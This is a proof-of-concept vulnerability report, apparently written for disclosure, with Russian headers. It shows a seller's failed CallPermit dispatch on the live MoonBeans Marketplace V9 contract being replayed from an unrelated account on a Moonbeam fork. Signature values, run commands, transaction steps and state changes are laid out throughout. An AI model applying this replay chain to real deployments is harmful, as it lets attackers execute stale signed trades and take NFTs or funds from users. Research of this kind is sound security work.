# MoonBeans V9 stale-price `acceptOffer` CallPermit replay: fork PoC

**Дата:** 2026-05-12  
**Результат:** `STALE_ACCEPT_OFFER_REPLAY_SUCCEEDED`  
**Скрипт:** `research/replay_moonbeans_acceptoffer_stale_chopsticks.js`  
**Результат прогона:** `research/replay_moonbeans_acceptoffer_stale_result.json`

---

## 1. Scope

Target marketplace:

```text
MoonBeans Marketplace V9
0x683724817a7d526d6256Aec0D6f8ddF541b924de
```

Target function:

```solidity
acceptOffer(address ca, uint256 tokenId, uint256 price, address from, bool escrowedBid)
```

CallPermit precompile:

```text
0x000000000000000000000000000000000000080a
```

Real contracts used on Moonbeam fork:

```text
Marketplace V9: 0x683724817a7d526d6256Aec0D6f8ddF541b924de
WGLMR:          0xAcc15dC74880C9944775448304B263D191c6077F
ERC721:         0x104b904e19fBDa76bb864731A2C9E01E6b41f855
TokenId:        1549
```

No Solidity mock contracts were deployed or used.

---

## 2. How To Run

Start Moonbeam-native Chopsticks:

```powershell
.\node_modules\.bin\chopsticks.cmd --config=moonbeam --port 8013 --build-block-mode Instant
```

Run PoC:

```powershell
$env:CHOPSTICKS_WS='ws://127.0.0.1:8013'
$env:RESULT_PATH='research\replay_moonbeans_acceptoffer_stale_result.json'
node research\replay_moonbeans_acceptoffer_stale_chopsticks.js
```

Expected output field:

```json
{
  "result": "STALE_ACCEPT_OFFER_REPLAY_SUCCEEDED"
}
```

---

## 3. Fork Preparation

The PoC uses real Moonbeam contracts and prepares fork state only where needed:

- assigns existing ERC721 `tokenId=1549` to the test seller by storage patching the real ERC721 state;
- funds test accounts with native GLMR on fork;
- uses real WGLMR `deposit()` and `approve()`;
- uses real Marketplace `makeOffer(...)` and `acceptOffer(...)`;
- patches Marketplace owner on fork only to disable fees and set collection trading, so seller payment equals the signed stale price exactly.

This keeps the exploit path inside the real deployed contracts:

```text
CallPermit.dispatch(...)
  -> MoonBeans Marketplace V9.acceptOffer(...)
      -> tokenPurchase(...)
          -> WGLMR.transferFrom(...)
          -> ERC721.safeTransferFrom(...)
```

---

## 4. Actors

From result JSON:

```text
Seller / signer:
0xE2823B3C9Eef89520617589c2056Fde633B61C53

Buyer-attacker:
0x0d0E74c0f8c790C89945B852fa8A5708516641D4

First failed dispatch sender:
0x387d113949a1a2D5Df01B869aa992e94Bd062035

Replay dispatcher:
0xdF57BB3c6DCA45Ef3dDE522c2601b6c4c7a0EA85

Replay dispatcher unrelated to seller and buyer:
true
```

---

## 5. Signed Action

Seller signs CallPermit for:

```text
acceptOffer(
  ca          = 0x104b904e19fBDa76bb864731A2C9E01E6b41f855,
  tokenId     = 1549,
  price       = 100000000000000000000,
  from        = 0x0d0E74c0f8c790C89945B852fa8A5708516641D4,
  escrowedBid = false
)
```

The signed calldata fixes:

- NFT collection;
- NFT tokenId;
- stale high price;
- buyer address;
- `escrowedBid=false`.

Inner `acceptOffer` calldata hash:

```text
0x676f2cec04dc4d8d554ca1c253af4451c3a2d3a78faf7d00e76c559c344878bb
```

Full CallPermit dispatch calldata hash:

```text
0x3c2bf2b895eb0fba2f016d019fbf80fc7a924efe95fc4438fda42cf415644353
```

Signature:

```text
v = 28
r = 0x602b45416f8cbbd21e0711d7887b6276853be540b011d0124a21261ff2a74648
s = 0x2ade04a9ab5bedb8d6d48384028fdf981ebb990baa432e3288d5406f9734e622
```

Signed nonce:

```text
0
```

---

## 6. Buyer Creates Real Non-Escrowed Offer

The buyer creates the offer through the real marketplace:

```text
makeOffer tx:
0xfa271e6337dd395f2f10fe9c5dc9765ce482fa432e6c4ae68acb8985124912b2
```

Offer after creation:

```json
{
  "price": "100000000000000000000",
  "accepted": false,
  "buyer": "0x0d0E74c0f8c790C89945B852fa8A5708516641D4",
  "escrowed": false
}
```

---

## 7. Attacker-Induced Failure

The buyer-attacker removes Marketplace WGLMR allowance:

```text
buyer approve(marketplace, 0) tx:
0x98ad30b4a5ae7f4b790723fbdf001d4270836165e5653a7a74c4b2e1a02c927a
```

Before failed dispatch:

```text
CallPermit nonce: 0
NFT owner:        seller
Buyer allowance: 0
Buyer WGLMR:     100000000000000000000
```

Failed dispatch:

```text
tx:
0xe62ffc825408696e135761e1a229a67081ef48fe5add611bd0f5b4abe1078d10

tx input hash:
0x3c2bf2b895eb0fba2f016d019fbf80fc7a924efe95fc4438fda42cf415644353
```

Observed revert:

```text
exitReason: Revert
extraData: Marketplace not approved to sp
expected source revert:
Marketplace not approved to spend buyer tokens.
```

The runtime event truncated `extraData`, but the revert maps to this exact Marketplace source check in `tokenPurchase(...)`:

```solidity
require(_token.allowance(newOwner, address(this)) >= price, "Marketplace not approved to spend buyer tokens.");
```

Nonce proof:

```text
nonce before failed dispatch: 0
nonce after failed dispatch:  0
```

The permit was valid and the failure happened inside the target Marketplace call. The failed tx publicly exposed the reusable `v/r/s` and exact dispatch calldata.

---

## 8. Restore Condition And Replay Exact Same Calldata

Buyer restores allowance:

```text
buyer approve(marketplace, staleHighPrice) tx:
0xc474cd4a26da63c5ffdd9bd42bf5adeab6d41da17a510334d22d80e499af27cd
```

Before replay:

```text
CallPermit nonce: 0
NFT owner:        seller
Buyer allowance: 100000000000000000000
Buyer WGLMR:     100000000000000000000
```

Replay tx from unrelated dispatcher:

```text
tx:
0xb5b8b90235abaf278a652dfef877ff82caac97ffbe134bcc3992631bce784254

replay dispatcher:
0xdF57BB3c6DCA45Ef3dDE522c2601b6c4c7a0EA85

tx input hash:
0x3c2bf2b895eb0fba2f016d019fbf80fc7a924efe95fc4438fda42cf415644353

exact same dispatch calldata reused:
true
```

After replay:

```text
CallPermit nonce: 1
NFT owner:        buyer-attacker
Seller WGLMR:    200000000000000000000
Buyer WGLMR:     0
Buyer allowance: 0
Offer accepted:  true
```

Payment proof:

```text
seller payment amount:
100000000000000000000

buyer payment amount:
100000000000000000000
```

The same signature is consumed only after successful replay:

```text
nonce before replay: 0
nonce after replay:  1
```

---

## 9. Required Assertions

All assertions passed in the JSON output:

```json
{
  "A_acceptOfferFixesStalePriceInCalldata": true,
  "B_buyerControlsRevertCondition": true,
  "C_failedDispatchLeaksReusableSignature": true,
  "D_exactSameCalldataReusableLater": true,
  "E_unrelatedReplayDispatcherWorks": true,
  "F_staleOrderExecutesLater": true,
  "G_nonceUnchangedAfterFailedDispatch": true,
  "H_nonceConsumedOnlyAfterSuccessfulReplay": true
}
```

---

## 10. Stale Price Interpretation

The PoC fixes `price = 100 WGLMR` inside signed calldata.

The report models later NFT floor as:

```text
assumed later floor = 60 WGLMR
signed stale price  = 100 WGLMR
```

For the buyer-attacker variant, the direct stale-profit narrative is strongest when the NFT market/floor later rises above the signed price, because the buyer can replay a stale cheap purchase. The same primitive also supports seller-benefiting stale-high acceptance if the seller is the party strategically keeping the authorization alive.

The core security issue is independent of the direction of price movement:

```text
failed CallPermit dispatch creates public reusable delayed authorization
```

The marketplace does not bind the acceptance to a fresh order timestamp, relayer, or one-shot failed-attempt invalidation.

---

## 11. Why This Is Not Relayer Griefing

Relayer griefing means the main harm is wasting gas by repeatedly submitting a reverted permit.

This PoC demonstrates a different impact:

- the failed tx reveals a valid signed authorization;
- nonce remains unchanged after the failed target call;
- the same calldata later succeeds;
- the replay changes ownership of a real ERC721;
- WGLMR moves from buyer to seller;
- nonce is consumed only after the successful replay.

The failed dispatch is not the end impact. It is the publication step that turns a private signed action into reusable public orderflow.

---

## 12. Why This Is Not Harmless Replay

It is not harmless because the replay performs the exact economically meaningful action:

```text
seller's signed acceptOffer authorization
-> NFT transferred to buyer
-> fixed signed WGLMR price paid
-> offer marked accepted
```

The replay dispatcher is unrelated to both seller and buyer, proving there is no relayer binding at the CallPermit layer.

---

## 13. Why This Is Not Generic Stale Order Behavior

Generic stale order behavior would mean an old order remains fillable because the marketplace intentionally leaves it open.

Here the additional vulnerability primitive is:

1. Seller authorization was not merely off-chain.
2. It was submitted on-chain through CallPermit.
3. The target call reverted because the buyer-attacker controlled allowance.
4. The failed dispatch publicly disclosed `v/r/s`.
5. CallPermit nonce was not consumed.
6. The exact same public calldata later executed successfully from an unrelated account.

So the issue is specifically:

```text
public reusable delayed authorization caused by failed CallPermit dispatch
```

The marketplace stale offer is the economic payload. CallPermit failed-dispatch replay is what preserves and publicizes the signed authorization after an attempted execution failed.

---

## 14. Final Verdict

The fork PoC proves the full chain requested:

```text
buyer creates non-escrowed offer
seller signs CallPermit acceptOffer at fixed stale price
buyer intentionally removes allowance
valid CallPermit dispatch fails inside acceptOffer/tokenPurchase
v/r/s and calldata are public
nonce remains 0
buyer restores allowance
unrelated account replays exact same dispatch calldata
replay succeeds
NFT transfers to buyer
seller receives fixed stale price
nonce becomes 1 only after successful replay
```

Final result:

```text
STALE_ACCEPT_OFFER_REPLAY_SUCCEEDED
```
